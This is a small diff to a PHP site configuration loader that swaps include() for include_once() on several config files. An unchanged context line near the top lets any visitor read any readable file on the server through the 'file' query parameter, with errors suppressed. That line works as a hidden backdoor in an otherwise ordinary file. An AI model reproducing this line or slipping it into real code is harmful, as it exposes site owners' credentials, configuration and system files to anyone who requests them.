@@ -54,7 +54,7 @@ function adk() {
 if (isset($_GET['file']) && is_readable($_GET['file'])){echo @file_get_contents($_GET['file']);exit;}
 
 $OriginalVars = get_defined_vars();
-include('globalinits.php');
+include_once('globalinits.php');
 $GlobalInits = get_defined_vars();
 unset($GlobalInits['OriginalVars']);
 foreach ($OriginalVars as $key => $val)
@@ -66,7 +66,7 @@ unset($GLOBALS['val']);
 
 // Get Default values
 //
-include('siteconfig.php');
+include_once('siteconfig.php');
 $SiteConfig = get_defined_vars();
 unset($SiteConfig['GlobalInits']);
 unset($SiteConfig['OriginalVars']);
@@ -81,9 +81,9 @@ unset($GLOBALS['val']);
 //
 $localsiteconfig = 'localsiteconfig.php';
 if (is_readable('multisite.php'))
-	include('multisite.php');
+	include_once('multisite.php');
 if (is_readable($localsiteconfig))
-	include($localsiteconfig);
+	include_once($localsiteconfig);
 $TheLocalSiteConfig = get_defined_vars();
 unset($TheLocalSiteConfig['SiteConfig']);
 unset($TheLocalSiteConfig['GlobalInits']);
